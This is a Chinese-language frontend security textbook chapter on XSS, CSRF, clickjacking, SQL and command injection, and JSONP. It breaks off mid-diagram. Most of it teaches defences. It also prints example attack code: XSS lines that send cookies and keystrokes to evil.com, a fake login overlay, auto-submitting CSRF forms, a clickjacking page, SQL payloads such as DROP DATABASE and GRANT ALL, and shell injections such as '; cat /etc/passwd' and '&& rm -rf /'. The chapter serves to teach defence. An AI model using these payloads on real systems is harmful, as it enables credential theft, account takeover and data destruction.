+++
title = "第 38 章 Web 安全"
weight = 380
date = "2026-03-24T22:08:00+08:00"
type = "docs"
description = ""
isCJKLanguage = true
draft = false
+++
# 第 38 章 Web 安全

> 互联网是个丛林世界，到处都是想偷你数据、搞瘫你网站的黑客。作为前端工程师，不懂安全就像裸奔在黑客眼皮底下——后果不堪设想！

## 38.1 XSS 跨站脚本攻击

### 38.1.1 XSS 的原理：攻击者在页面中注入恶意脚本

XSS 的全称是 **Cross-Site Scripting**（跨站脚本攻击），简称 XSS。为啥不叫 CSS？因为 CSS 已经被层叠样式表（Cascading Style Sheets）占用了，所以安全圈约定俗成用 XSS。

XSS 的核心原理就是：**攻击者把恶意代码注入到网页中，当其他用户访问这个页面时，恶意代码就会在用户浏览器里执行**。

想象一下：你开了家餐厅（网站），黑客趁你不注意，往你的菜里下了毒（注入恶意脚本），结果来吃饭的客人都中招了——这就是 XSS 的基本套路。

```javascript
// 场景：评论区没有过滤用户输入
// 用户输入了一段"特殊"的留言

const userComment = `<img src=x onerror="alert('你的Cookie被我偷走了！')">`;

// 如果网站直接把这段内容渲染到页面上...
document.querySelector(".comments").innerHTML = userComment;

// 结果：用户的浏览器执行了 alert（实际是更恶意的代码）
```

看图理解 XSS 攻击流程：

```mermaid
graph LR
    A["攻击者"] -->|"1. 提交恶意脚本"| B["服务器数据库"]
    B -->|"2. 其他用户访问页面"| C["用户浏览器"]
    C -->|"3. 恶意脚本执行"| D["窃取Cookie/跳转钓鱼网站等"]
    style A fill:#ff6b6b
    style D fill:#ff6b6b
```

---

### 38.1.2 反射型 XSS：恶意脚本通过 URL 参数注入，服务端直接返回

**反射型 XSS** 是最"简单粗暴"的类型。恶意脚本不在服务器里存储，而是藏在 URL 参数里，服务器把参数"反射"回页面，用户一点链接就中招。

```javascript
// 一个搜索功能
// URL: https://example.com/search?q=<script>alert('XSS')</script>

// 服务器代码（伪代码）
app.get("/search", (req, res) => {
  const query = req.query.q;
  // 错误写法：直接把用户输入塞到页面里
  res.send(`<h1>搜索结果: ${query}</h1>`);
});

// 访问这个 URL 时，script 标签会被执行！
// https://example.com/search?q=<script>stealCookies()</script>
```

**攻击步骤**：

```mermaid
graph LR
    A["攻击者"] -->|"1. 构造恶意URL"| B["用户点击链接"]
    B -->|"2. 浏览器请求服务器"| C["服务器"]
    C -->|"3. 反射回URL参数"| D["用户浏览器"]
    D -->|"4. 执行恶意脚本"| E["攻击成功"]
```

**常见场景**：

- 搜索结果页面
- 错误信息显示
- URL 重定向后的提示

---

### 38.1.3 存储型 XSS：恶意脚本存入数据库，所有访问该数据的用户都会受害

**存储型 XSS** 是最危险的一种！恶意脚本被永久存储在服务器（数据库），所有访问该数据的用户都会"中招"。

```javascript
// 场景：用户评论区
// 攻击者发表了一条恶意评论

const maliciousComment = `
  <img src=x onerror="
    fetch('https://evil.com/steal', {
      method: 'POST',
      body: document.cookie
    })
  ">
`;

// 服务器错误地把这条评论存入了数据库
// db.comments.insert({ content: maliciousComment });

// 现在每个访问评论区的人都会执行这段代码！
```

**攻击流程**：

```mermaid
graph TD
    A["攻击者提交恶意内容"] --> B["服务器存入数据库"]
    B --> C["普通用户访问页面"]
    C --> D["服务器返回含恶意代码的页面"]
    D --> E["用户浏览器执行脚本"]
    E --> F["Cookie等敏感信息被盗"]
    style A fill:#ff6b6b
    style F fill:#ff6b6b
```

**危害升级**：

存储型 XSS 就像是在你的餐厅里埋了一颗定时炸弹——每个进门的客人都可能触发，而且你根本不知道什么时候会炸。

---

### 38.1.4 DOM 型 XSS：纯前端攻击，恶意脚本通过修改 DOM 操作注入

**DOM 型 XSS** 是一种"纯前端"的攻击方式，恶意代码从来不出现在服务器响应中，完全靠前端 JavaScript 的错误操作来注入。

```javascript
// 场景：前端从 URL 读取参数并渲染
const params = new URLSearchParams(window.location.search);
const name = params.get("name");

// 错误写法：直接插入到 DOM
document.getElementById("welcome").innerHTML = `欢迎, ${name}`;

// 构造恶意 URL：
// https://example.com?name=<img src=x onerror=stealCookies()>

// 访问后，img 标签的 onerror 会被执行！
```

**与反射型的区别**：

| 类型 | 服务器参与 | 数据存储 | 触发方式 |
|------|-----------|---------|---------|
| 反射型 | 服务端返回恶意代码 | 不存储 | 用户点击恶意链接 |
| DOM型 | 服务器返回正常内容 | 不存储 | 前端 JS 错误解析 URL |

---

### 38.1.5 XSS 的危害：窃取 Cookie / 监听键盘输入 / 篡改页面内容 / 发起钓鱼攻击

XSS 能做的事可多了，简直是黑客的"瑞士军刀"：

**1. 窃取 Cookie**

```javascript
// 攻击代码：把用户的 Cookie 发送到攻击者服务器
fetch("https://evil.com/steal?cookie=" + document.cookie);

// 或者用图片的方式（更隐蔽）
new Image().src = "https://evil.com/steal?cookie=" + document.cookie;
```

**2. 监听键盘输入**

```javascript
// 监听用户输入的敏感信息（密码、信用卡号等）
document.addEventListener("keypress", (e) => {
  fetch("https://evil.com/log?key=" + e.key);
});
```

**3. 篡改页面内容**

```javascript
// 偷偷替换页面上的内容，比如把收款账户换成黑客的
document.querySelector(".bank-account").textContent = "黑客的账户";
```

**4. 发起钓鱼攻击**

```javascript
// 在页面上覆盖一个假的登录框
const fakeLogin = document.createElement("div");
fakeLogin.innerHTML = `
  <div style="position:fixed;top:0;left:0;width:100%;height:100%;
              background:rgba(0,0,0,0.8);z-index:9999">
    <form onsubmit="sendData()">
      <h2>请重新登录</h2>
      <input type="text" placeholder="用户名">
      <input type="password" placeholder="密码">
      <button>登录</button>
    </form>
  </div>
`;
document.body.appendChild(fakeLogin);
```

---

### 38.1.6 XSS 防御：输入过滤 / 输出编码 / HTTPOnly Cookie / CSP 内容安全策略

**防御手段一：输入过滤**

```javascript
// 过滤危险字符
function filterInput(input) {
  return input
    .replace(/</g, "&lt;")   // 转义 <
    .replace(/>/g, "&gt;")   // 转义 >
    .replace(/"/g, "&quot;") // 转义 "
    .replace(/'/g, "&#x27;") // 转义 '
    .replace(/\//g, "&#x2F;"); // 转义 /
}

const safeComment = filterInput(userInput);
```

**防御手段二：输出编码**

```javascript
// 不同场景使用不同的编码方式

// HTML 上下文
function escapeHtml(str) {
  return str
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#039;");
}

// JavaScript 上下文
function escapeJs(str) {
  return JSON.stringify(str).slice(1, -1);
}

// URL 上下文
function escapeUrl(str) {
  return encodeURIComponent(str);
}
```

**防御手段三：HTTPOnly Cookie**

```javascript
// 设置 HTTPOnly 标志的 Cookie，JavaScript 无法读取
res.cookie("sessionId", "abc123", {
  httpOnly: true, // JavaScript 无法通过 document.cookie 访问
  secure: true,
  sameSite: "strict"
});
```

**防御手段四：CSP（内容安全策略）**

```javascript
// 服务器设置 CSP 响应头
// 限制脚本只能从同源加载，禁止内联脚本执行

// 方式1：Meta 标签
// <meta http-equiv="Content-Security-Policy" content="script-src 'self'">

// 方式2：HTTP 响应头
// Content-Security-Policy: script-src 'self'; style-src 'self' 'unsafe-inline'

// CSP 指令说明：
// script-src: 限制脚本来源
// style-src: 限制样式来源
// img-src: 限制图片来源
// default-src: 默认来源
```

```nginx
# Nginx 配置示例
add_header Content-Security-Policy "default-src 'self'; script-src 'self' https://trusted-cdn.com;";
```

```apache
# Apache 配置示例
Header set Content-Security-Policy "default-src 'self'; script-src 'self' https://trusted-cdn.com"
```

**XSS 防御总结图**：

```mermaid
graph TD
    A["用户输入"] --> B{"服务端校验"}
    B -->|"过滤危险字符"| C["安全数据"]
    C --> D["存入数据库"]
    D --> E["前端渲染"]
    E --> F{"输出编码"}
    F --> G["安全展示"]
    A2["攻击者输入"] -->|"恶意脚本"| B
    B -->|"检测到XSS"| H["拒绝/过滤"]
    style A2 fill:#ff6b6b
    style H fill:#98d8c8
```

---

**本节小结**

XSS（跨站脚本攻击）是 Web 安全最常见的漏洞之一：

| 类型 | 特点 | 危险程度 |
|------|------|---------|
| 反射型 | URL 参数携带，不存储 | ⭐⭐ |
| 存储型 | 存入数据库，影响所有用户 | ⭐⭐⭐⭐⭐ |
| DOM型 | 纯前端，服务器无感知 | ⭐⭐⭐ |

防御手段：输入过滤、输出编码、HTTPOnly Cookie、CSP

## 38.2 CSRF 跨站请求伪造

### 38.2.1 CSRF 的原理：诱导用户访问恶意页面，自动携带 Cookie 发起请求

CSRF 的全称是 **Cross-Site Request Forgery**（跨站请求伪造）。跟 XSS 的"注入脚本"不同，CSRF 是"伪造请求"。

**CSRF 的核心思想**：用户登录了网站 A，攻击者诱骗用户访问网站 B，网站 B 自动以用户的身份向网站 A 发起请求。由于浏览器会自动携带用户登录网站 A 时的 Cookie，网站 A 无法区分这是用户主动发起的还是被伪造的。

```mermaid
graph LR
    A["用户登录网站A"] -->|"获得Cookie"| B["浏览器"]
    B -->|"1. 访问恶意网站B"| C["网站B页面"]
    C -->|"2. 自动发起请求|自动携带Cookie"| D["网站A"]
    D -->|"3. 以为是用户本人"| E["执行非法操作"]
    style C fill:#ff6b6b
    style E fill:#ff6b6b
```

**举个例子**：你登录了银行网站转账页面，攻击者发给你一个链接，你点开后，页面里的 JavaScript 自动向银行发起转账请求，因为浏览器自动带上了你的登录 Cookie，银行以为是你本人操作的！

```html
<!-- 恶意网站页面 -->
<html>
<body>
  <h1>恭喜你中奖了！</h1>
  <!-- 隐藏的表单，自动提交 -->
  <form action="https://bank.com/transfer" method="POST" id="attackForm">
    <input type="hidden" name="to" value="hacker_account">
    <input type="hidden" name="amount" value="10000">
  </form>
  <script>
    document.getElementById("attackForm").submit(); // 自动提交！
  </script>
</body>
</html>
```

---

### 38.2.2 CSRF 的危害：用户不知情的情况下完成转账 / 发帖 / 修改密码等操作

CSRF 能造成的危害取决于网站的功能：

**1. 资金转账**

```javascript
// 攻击代码：伪造转账请求
fetch("https://bank.com/api/transfer", {
  method: "POST",
  credentials: "include", // 携带 Cookie
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({
    toAccount: "hacker",
    amount: 100000
  })
});
```

**2. 修改密码**

```javascript
// 伪造修改密码请求
fetch("https://website.com/api/change-password", {
  method: "POST",
  credentials: "include",
  body: new URLSearchParams({
    newPassword: "hacker_password"
  })
});
```

**3. 发布内容**

```javascript
// 伪造发帖请求
fetch("https://forum.com/api/post", {
  method: "POST",
  credentials: "include",
  body: JSON.stringify({
    title: "钓鱼广告",
    content: "点击这里赚钱..."
  })
});
```

**4. 关注/点赞**

```javascript
// 批量关注账号
for (const userId of ["1001", "1002", "1003"]) {
  fetch(`https://social.com/api/follow/${userId}`, {
    method: "POST",
    credentials: "include"
  });
}
```

---

### 38.2.3 Token 验证：表单中添加随机 Token，服务端校验

**Token 验证**是目前最常用的 CSRF 防御手段。

原理：服务器给每个表单生成一个随机 Token，提交时必须带上这个 Token，服务器校验通过才执行操作。

```javascript
// 服务器端生成 Token 并发送到表单
// 伪代码示例

// 1. 生成并存储 Token
const csrfToken = crypto.randomBytes(32).toString("hex");
sessions[userId].csrfToken = csrfToken;

// 2. 在表单中添加 Token
const html = `
  <form action="/transfer" method="POST">
    <input type="hidden" name="csrf_token" value="${csrfToken}">
    目标账户: <input name="to">
    金额: <input name="amount">
    <button type="submit">转账</button>
  </form>
`;

// 3. 提交时验证 Token
app.post("/transfer", (req, res) => {
  const { csrf_token } = req.body;
  const session = getSession(req);

  if (csrf_token !== session.csrfToken) {
    return res.status(403).send("CSRF 验证失败！");
  }

  // Token 验证通过，执行转账
  executeTransfer(req.body);
});
```

**前端获取和发送 Token**：

```javascript
// 获取 Token（从 meta 标签）
const getCsrfToken = () => {
  const meta = document.querySelector('meta[name="csrf-token"]');
  return meta ? meta.content : "";
};

// 发送请求时自动带上 Token
const originalFetch = window.fetch;
window.fetch = async (url, options = {}) => {
  options.headers = options.headers || {};

  // 非 GET 请求自动带上 CSRF Token
  if (options.method && options.method !== "GET") {
    options.headers["X-CSRF-Token"] = getCsrfToken();
  }

  return originalFetch(url, options);
};
```

**Token 验证流程图**：

```mermaid
graph TD
    A["用户访问表单页面"] --> B["服务器生成CSRF Token"]
    B --> C["表单包含Token"]
    C --> D["用户提交表单"]
    D --> E["服务器比对Token"]
    E -->|"Token匹配"| F["执行操作"]
    E -->|"Token不匹配"| G["拒绝请求"]
    style F fill:#98d8c8
    style G fill:#ff6b6b
```

---

### 38.2.4 SameSite Cookie：设置 Cookie 的 SameSite 属性

**SameSite** 是 Cookie 的一个属性，可以防止 CSRF 攻击！

```javascript
// 设置 SameSite Cookie
res.cookie("sessionId", "abc123", {
  httpOnly: true,
  sameSite: "strict" // 关键设置！
});
```

**SameSite 的三个值**：

| 值 | 行为 | 安全性 |
|----|------|--------|
| `Strict` | Cookie 只在同站请求时发送 | 最高，但体验较差 |
| `Lax` | 允许导航到站点的 GET 请求携带 | 推荐，兼顾安全与体验 |
| `None` | 任何请求都携带（需配合 Secure） | 最不安全 |

```javascript
// 推荐配置：Lax
res.cookie("sessionId", "abc123", {
  httpOnly: true,
  sameSite: "lax",
  secure: true // HTTPS 必须
});

// 严格模式：Strict（用户体验较差，比如从外部链接跳转过来会丢 Cookie）
res.cookie("sessionId", "abc123", {
  httpOnly: true,
  sameSite: "strict"
});
```

**SameSite 工作原理图**：

```mermaid
graph LR
    A["用户从外部链接"] -->|"点击链接"| B{"SameSite 设置"}
    B -->|"Strict"| C["不携带Cookie"]
    B -->|"Lax"| D{"是GET请求?"]
    D -->|"是"| E["携带Cookie"]
    D -->|"否"| F["不携带Cookie"]
    B -->|"None"| G["携带Cookie<br/>(需HTTPS)"]
    style C fill:#98d8c8
    style E fill:#98d8c8
    style F fill:#ff6b6b
```

---

### 38.2.5 CSRF vs XSS 的区别

很多人容易把 CSRF 和 XSS 搞混，它们虽然都是 Web 安全漏洞，但原理完全不同：

```mermaid
graph LR
    subgraph XSS["XSS - 注入脚本"]
        X1["攻击者在页面中注入恶意脚本"]
        X2["恶意脚本在用户浏览器执行"]
        X3["可以读写Cookie/操作DOM"]
    end
    subgraph CSRF["CSRF - 伪造请求"]
        C1["攻击者诱导用户访问恶意页面"]
        C2["恶意页面自动发起请求"]
        C3["利用用户已有的Cookie执行操作"]
    end
```

**核心区别**：

| 区别 | XSS | CSRF |
|------|-----|------|
| 攻击原理 | 注入恶意脚本到页面 | 伪造用户发起请求 |
| 执行位置 | 用户浏览器 | 服务器 |
| 是否需要 JS | 需要（注入脚本） | 不需要（可以用表单自动提交） |
| Cookie 处理 | 脚本可以直接读取 | 浏览器自动携带，无法阻止 |
| 防御重点 | 防止脚本注入 | 防止请求被伪造 |

**组合攻击**：

更可怕的是，XSS 和 CSRF 可以组合使用！XSS 可以偷走 Token，CSRF 绕过 Token 验证：

```javascript
// 先用 XSS 注入获取 Token
const token = document.querySelector("input[name='csrf']").value;

// 再用这个 Token 发起 CSRF 攻击
fetch("/transfer", {
  method: "POST",
  headers: { "X-CSRF-Token": token },
  credentials: "include",
  body: JSON.stringify({ to: "hacker", amount: 10000 })
});
```

**这就是为什么防御要全面：只防 XSS 不防 CSRF，或者只防 CSRF 不防 XSS，都是不行的！**

---

**本节小结**

CSRF（跨站请求伪造）利用用户已登录的身份伪造请求：

| 防御手段 | 原理 |
|---------|------|
| Token 验证 | 表单包含随机 Token，服务端校验 |
| SameSite Cookie | 限制 Cookie 的携带范围 |
| 验证来源 | 检查请求的 Referer/Origin 头 |

**最佳实践**：同时使用 Token 验证 + SameSite Cookie + 验证请求来源

## 38.3 点击劫持

### 38.3.1 点击劫持的原理：用 iframe 覆盖原页面，诱导用户点击透明按钮

**点击劫持（Clickjacking）**听起来像是黑客电影里的情节，但它是真实存在的攻击方式！

原理：攻击者在一个页面里用透明的 iframe 覆盖了目标网站，用户以为是点击了"无害"的按钮，实际上点击的是 iframe 里的敏感按钮（比如"确认转账"）。

```mermaid
graph TD
    subgraph Attack["攻击者页面"]
        A1["恶意网站"]
        A2["透明iframe<br/>包含银行转账页面"]
        A3["诱惑按钮<br/>'免费领礼物'"]
    end
    subgraph Victim["用户视角"]
        V1["看到的是'免费领礼物'"]
        V2["实际点击的是转账按钮"]
    end
    A2 -->|"覆盖"| A3
    V1 -->|"点击"| A3
    A3 -->|"实际触发了"| B["银行转账"]
    style A2 fill:rgba(0,0,0,0)
```

**攻击示例**：

```html
<!-- 攻击者页面 -->
<!DOCTYPE html>
<html>
<head>
  <style>
    /* 恶意页面样式 */
    .attractive-button {
      position: absolute;
      top: 200px;
      left: 100px;
      padding: 20px 40px;
      font-size: 24px;
      background: linear-gradient(45deg, #ff6b6b, #ffd93d);
      cursor: pointer;
      z-index: 1;
    }

    /* 透明的恶意 iframe */
    .malicious-iframe {
      position: absolute;
      top: 195px;
      left: 95px;
      width: 200px;
      height: 60px;
      opacity: 0; /* 完全透明！ */
      z-index: 0; /* 在按钮下面，但实际覆盖在按钮之上 */
    }
  </style>
</head>
<body>
  <h1>🎁 点击领取免费礼物！</h1>
  <button class="attractive-button">免费领取</button>

  <!-- 透明 iframe 覆盖在按钮上 -->
  <iframe class="malicious-iframe"
          src="https://bank.com/transfer?to=hacker&amount=10000">
  </iframe>
</body>
</html>
```

用户看到的只是"免费领取"按钮，点击后实际触发的是 iframe 里的转账操作！

---

### 38.3.2 X-Frame-Options 响应头：禁止页面被嵌入 iframe

**X-Frame-Options** 是服务器设置的 HTTP 响应头，可以防止页面被嵌入 iframe。

```javascript
// Node.js/Express 设置
app.use((req, res, next) => {
  // DENY: 完全禁止被嵌入
  // SAMEORIGIN: 只允许同源嵌入
  // ALLOW-FROM https://example.com: 只允许指定来源（已废弃）
  res.setHeader("X-Frame-Options", "DENY");
  next();
});
```

```nginx
# Nginx 配置
add_header X-Frame-Options "DENY";
```

```apache
# Apache 配置
Header always set X-Frame-Options "DENY"
```

**三个值的行为**：

| 值 | 行为 |
|----|------|
| DENY | 任何情况都不能嵌入 |
| SAMEORIGIN | 只有同源才能嵌入 |
| ALLOW-FROM uri | 只允许指定来源（浏览器支持不一致，已废弃） |

---

### 38.3.3 CSP frame-ancestors 指令

**CSP（Content Security Policy）** 的 **frame-ancestors** 指令是 X-Frame-Options 的升级版，更灵活！

```javascript
// CSP frame-ancestors 配置
res.setHeader("Content-Security-Policy", "frame-ancestors 'none'"); // 禁止任何嵌入
res.setHeader("Content-Security-Policy", "frame-ancestors 'self'"); // 只允许同源
res.setHeader("Content-Security-Policy", "frame-ancestors https://trusted-site.com"); // 指定域名
```

```html
<!-- Meta 标签方式 -->
<!-- <meta http-equiv="Content-Security-Policy" content="frame-ancestors 'none'"> -->
```

**frame-ancestors vs X-Frame-Options**：

| 特性 | X-Frame-Options | CSP frame-ancestors |
|------|-----------------|---------------------|
| 语法 | 简单 | 灵活 |
| 多个来源 | 不支持 | 支持 |
| 覆盖 | 整个页面 | 资源级别 |
| 兼容性 | IE8+ | 现代浏览器 |

**推荐同时设置两者**，以确保兼容性和安全性：

```javascript
// 双重保险
res.setHeader("X-Frame-Options", "DENY");
res.setHeader("Content-Security-Policy", "frame-ancestors 'none'");
```

---

### 38.3.4 防御措施：检测顶层窗口 / JS 防护代码

**方法一：检测是否被嵌入 iframe**

```javascript
// 检测当前页面是否被嵌入 iframe
if (window.top !== window.self) {
  // 被嵌入了，可以跳出来或者显示警告
  window.top.location.href = window.self.location.href;
}
```

**方法二：增强检测（防止被绕过）**

```javascript
// 定时检测
setInterval(() => {
  // 检测 window 是否有变化
  if (window.top !== window.self) {
    // 尝试跳出
    try {
      window.top.location = window.self.location;
    } catch (e) {
      // 如果被跨域限制，可以显示警告或者拒绝访问
      document.body.innerHTML = "<h1>禁止嵌套访问！</h1>";
    }
  }
}, 1000);
```

**方法三：使用 sandbox 属性限制 iframe**

```html
<!-- 攻击者使用 iframe 时，可以设置 sandbox 属性限制其能力 -->
<iframe
  src="https://bank.com"
  sandbox="allow-scripts" <!-- 只允许执行脚本 -->
>
<!-- 但这需要在攻击者那边设置，网站无法控制 -->
```

**方法四：使用 Frame-Breaking Script（古老但有效）**

```html
<!-- 在页面 head 中加入这段 CSS/JS -->
<style id="framebreaker">
  body { display: none !important; }
</style>
<script>
  if (self === top) {
    document.getElementById("framebreaker").style.display = "none";
  } else {
    top.location = self.location;
  }
</script>
```

**防御措施对比图**：

```mermaid
graph TD
    A["防止点击劫持"] --> B["X-Frame-Options"]
    A --> C["CSP frame-ancestors"]
    A --> D["JS 检测跳出"]
    A --> E["Frame-Breaking CSS"]
    B --> F["服务端配置，最有效"]
    C --> F
    D --> G["前端兜底"]
    E --> G
    style F fill:#98d8c8
    style G fill:#98d8c8
```

---

**本节小结**

点击劫持通过透明 iframe 诱导用户点击：

| 防御手段 | 说明 |
|---------|------|
| X-Frame-Options | HTTP 响应头，禁止嵌入 |
| CSP frame-ancestors | 更灵活的 CSP 指令 |
| JS 检测跳出 | 前端检测并跳出 iframe |

**最佳实践**：服务端设置 X-Frame-Options + CSP，前端 JS 兜底检测

## 38.4 SQL 注入与命令注入

### 38.4.1 SQL 注入的原理：用户输入拼接到 SQL 语句中

**SQL 注入**是一种让攻击者通过 Web 表单、URL 参数等渠道，把恶意 SQL 代码注入到应用程序的数据库查询中的攻击方式。

```mermaid
graph LR
    A["用户输入"] -->|"正常输入|admin"| B["SELECT * FROM users WHERE name='admin'"]
    A2["攻击者输入"] -->|"' OR '1'='1"| C["SELECT * FROM users WHERE name='' OR '1'='1'"]
    C --> D["绕过认证，获取所有数据"]
    style A2 fill:#ff6b6b
    style C fill:#ff6b6b
    style D fill:#ff6b6b
```

**经典 SQL 注入示例**：

```javascript
// 错误的登录查询（拼接 SQL）
const query = `SELECT * FROM users WHERE name='${username}' AND password='${password}'`;

// 正常用户输入：
// username: "zhangsan"
// password: "123456"
// 查询: SELECT * FROM users WHERE name='zhangsan' AND password='123456'

// 攻击者输入：
// username: "admin' --"
// password: "anything"
// 查询: SELECT * FROM users WHERE name='admin' --' AND password='anything'
// -- 后面的内容被当作注释，整个 WHERE 条件变成 name='admin'
```

**登录绕过攻击**：

```sql
-- 正常查询
SELECT * FROM users WHERE name='zhangsan' AND password='123456'

-- 注入后（绕过密码验证）
SELECT * FROM users WHERE name='admin' --' AND password='xxx'
-- 密码验证被注释掉了，直接以 admin 身份登录！
```

---

### 38.4.2 危害：数据泄露 / 数据篡改 / 数据库破坏

**1. 数据泄露**

```sql
-- 攻击：获取所有用户信息
' UNION SELECT * FROM users --

-- 攻击：获取数据库版本信息
' UNION SELECT @@version --

-- 攻击：获取其他表的数据
' UNION SELECT NULL, username, password FROM admin_users --
```

**2. 数据篡改**

```sql
-- 修改数据
'; UPDATE users SET role='admin' WHERE name='attacker'; --

-- 修改商品价格
'; UPDATE products SET price=0.01; --
```

**3. 数据库破坏**

```sql
-- 删除表
'; DROP TABLE users; --

-- 删除整个数据库
'; DROP DATABASE webapp; --

-- 修改表结构
'; ALTER TABLE users ADD COLUMN hacked BOOLEAN DEFAULT TRUE; --
```

**4. 执行系统命令（高危）**

```sql
-- MySQL 写入文件
'; SELECT '<script>malicious()</script>' INTO OUTFILE '/var/www/html/xss.js'; --

-- 开启远程访问
'; GRANT ALL PRIVILEGES ON *.* TO 'hacker'@'%' IDENTIFIED BY 'password'; --
```

---

### 38.4.3 防御：参数化查询 / 预编译语句 / 输入过滤

**防御一：参数化查询（Prepared Statements）**

```javascript
// Node.js + MySQL 使用参数化查询
const mysql = require("mysql2/promise");

const pool = mysql.createPool({
  host: "localhost",
  user: "root",
  password: "password",
  database: "app"
});

// 正确的做法：使用参数化查询
async function getUser(username, password) {
  const [rows] = await pool.execute(
    "SELECT * FROM users WHERE username = ? AND password = ?",
    [username, password] // 参数单独传递
  );
  return rows;
}

// 攻击者的输入会被当作纯文本处理，不会被执行！
```

```javascript
// Node.js + PostgreSQL
const { Client } = require("pg");

const client = new Client({
  connectionString: "postgresql://user:pass@localhost/db"
});

async function getUser(username, password) {
  const result = await client.query(
    "SELECT * FROM users WHERE username = $1 AND password = $2",
    [username, password]
  );
  return result.rows;
}
```

**防御二：使用 ORM（对象关系映射）**

```javascript
// Sequelize ORM
const { User } = require("./models");

async function getUser(username, password) {
  return await User.findOne({
    where: {
      username: username,
      password: password
    }
  });
}
// ORM 会自动处理参数化查询
```

**防御三：输入过滤**

```javascript
// 白名单过滤
function sanitizeInput(input) {
  // 只允许字母数字
  return input.replace(/[^a-zA-Z0-9]/g, "");
}

// 长度限制
function validateLength(input, maxLength) {
  if (input.length > maxLength) {
    throw new Error("输入过长");
  }
  return input;
}

// 类型检查
function validateType(input) {
  if (typeof input !== "string") {
    throw new Error("输入必须是字符串");
  }
  return input;
}
```

**参数化查询 vs 字符串拼接对比**：

```mermaid
graph LR
    subgraph Unsafe["❌ 不安全：字符串拼接"]
        U1["用户输入"]
        U2["拼接到SQL"]
        U3["SELECT * WHERE name='${input}'"]
        U4["' OR '1'='1 成为SQL的一部分"]
    end
    subgraph Safe["✅ 安全：参数化查询"]
        S1["用户输入"]
        S2["发送到数据库"]
        S3["SELECT * WHERE name=?"]
        S4["参数单独传递，不参与SQL解析"]
    end
    style U4 fill:#ff6b6b
    style S4 fill:#98d8c8
```

---

### 38.4.4 命令注入：用户输入拼接到系统命令中（如 eval / exec）

**命令注入**比 SQL 注入更可怕——攻击者可以直接在服务器上执行任意系统命令！

```javascript
// 危险！用户输入拼接到系统命令
const { exec } = require("child_process");

// 场景：ping 功能
app.get("/ping", (req, res) => {
  const host = req.query.host;
  // 危险！直接执行用户输入
  exec(`ping -c 3 ${host}`, (err, stdout, stderr) => {
    res.send(stdout);
  });
});

// 正常请求：/ping?host=google.com
// 恶意请求：/ping?host=google.com; cat /etc/passwd
```

**命令注入的常见场景**：

```javascript
// 场景1：文件处理
const filename = req.body.filename;
exec(`convert ${filename} output.jpg`); // 文件名可能包含恶意命令

// 场景2：用户信息查询
const userId = req.query.id;
exec(`finger ${userId}`); // 用户输入可能包含分号后的其他命令

// 场景3：DNS 查询
exec(`nslookup ${domain}`); // 可能被注入其他命令

// 场景4：eval（最危险！）
eval(`var user = ${userInput}`); // 用户输入直接被当作 JavaScript 执行！
```

**命令注入示例**：

```bash
# 正常输入
host=google.com
命令执行: ping -c 3 google.com

# 恶意输入
host=google.com; cat /etc/passwd
命令执行: ping -c 3 google.com; cat /etc/passwd
# 第二条命令也会被执行！

# 更危险的输入
host=google.com && rm -rf / && ping
# 可能删除整个系统！
```

---

### 38.4.5 防御：不使用危险函数 / 输入白名单过滤

**防御一：绝对不要用 eval / Function / setTimeout(string)**

```javascript
// ❌ 危险！绝对不要这样用
eval(userInput);
new Function(userInput);
setTimeout(userInput, 0);
setInterval(userInput, 0);

// ✅ 用 JSON.parse 替代 eval 处理 JSON
try {
  const data = JSON.parse(userInput);
} catch (e) {
  // 处理 JSON 解析错误
}
```

**防御二：使用白名单验证输入**

```javascript
// 允许的字符白名单
function sanitizeCommand(input) {
  // 只允许字母、数字、点、空格、连字符（下同）
  const safe = input.match(/^[a-zA-Z0-9.\s-]+$/);
  if (!safe) {
    throw new Error("输入包含非法字符");
  }
  return safe[0];
}

// IP 地址白名单
function isValidIP(ip) {
  const ipv4Pattern = /^(\d{1,3}\.){3}\d{1,3}$/;
  if (!ipv4Pattern.test(ip)) return false;

  const parts = ip.split(".");
  return parts.every(part => {
    const num = parseInt(part, 10);
    return num >= 0 && num <= 255;
  });
}
```

**防御三：使用 spawn 替代 exec，设置严格的选项**

```javascript
const { spawn } = require("child_process");

// ✅ 使用 spawn，更安全
app.get("/ping", (req, res) => {
  const host = sanitizeCommand(req.query.host);

  // spawn 用数组传递参数，不会被注入
  const ping = spawn("ping", ["-c", "3", host]);

  let output = "";
  ping.stdout.on("data", (data) => { output += data; });
  ping.stderr.on("data", (data) => { output += data; });
  ping.on("close", () => res.send(output));
});
```

**防御四：使用专门的库**

```javascript
// 使用 shell-escape 或类似库
const shellescape = require("shell-escape");

const safeCommand = (cmd, args) => {
  const safeArgs = args.map(arg => shellescape([arg]));
  return `${cmd} ${safeArgs.join(" ")}`;
};

// 或者使用 execFile 替代 exec
const { execFile } = require("child_process");
execFile("ping", ["-c", "3", host], (err, stdout) => {
  // execFile 只执行指定文件，不执行 shell 命令
});
```

**命令注入防御总结图**：

```mermaid
graph TD
    A["用户输入"] --> B{"验证输入"}
    B -->|"白名单"| C["安全执行"]
    B -->|"包含危险字符"| D["拒绝执行"]
    A -->|"直接拼接"| E["命令注入！"]
    E --> F["数据泄露/系统破坏"]
    C --> G["使用spawn/execFile"]
    G --> H["参数化执行"]
    style D fill:#98d8c8
    style E fill:#ff6b6b
    style F fill:#ff6b6b
```

---

**本节小结**

SQL 注入和命令注入都是"输入拼接"惹的祸：

| 注入类型 | 危害 | 防御 |
|---------|------|------|
| SQL 注入 | 数据泄露/篡改 | 参数化查询 |
| 命令注入 | 服务器被控制 | 不用 eval/白名单过滤 |

**核心原则**：永远不要相信用户输入，永远不要拼接用户输入到命令/SQL 中！

## 38.5 JSONP 安全

### 38.5.1 JSONP 的原理与跨域机制

**JSONP（JSON with Padding）** 是一种古老的跨域技术，在 CORS 出现之前，它是实现跨域数据获取的"救命稻草"。

**为什么需要 JSONP？**

由于浏览器同源策略的限制，`XMLHttpRequest` 或 `fetch` 无法直接请求不同域的接口。JSONP 利用了 `<script>` 标签可以跨域加载脚本的特性来实现跨域。

```javascript
// 正常 AJAX 请求会被同源策略阻止
fetch("https://other-domain.com/api/data") // ❌ 跨域被阻止

// 但 script 标签可以跨域加载！
// <script src="https://other-domain.com/api/data.js"></script>
```

**JSONP 的原理**：

```mermaid
graph LR
    A["前端"] -->|"1. 注册全局回调函数"| B["window.getData"]
    A -->|"2. 创建script标签|src=?callback=getData"| C["第三方服务器"]
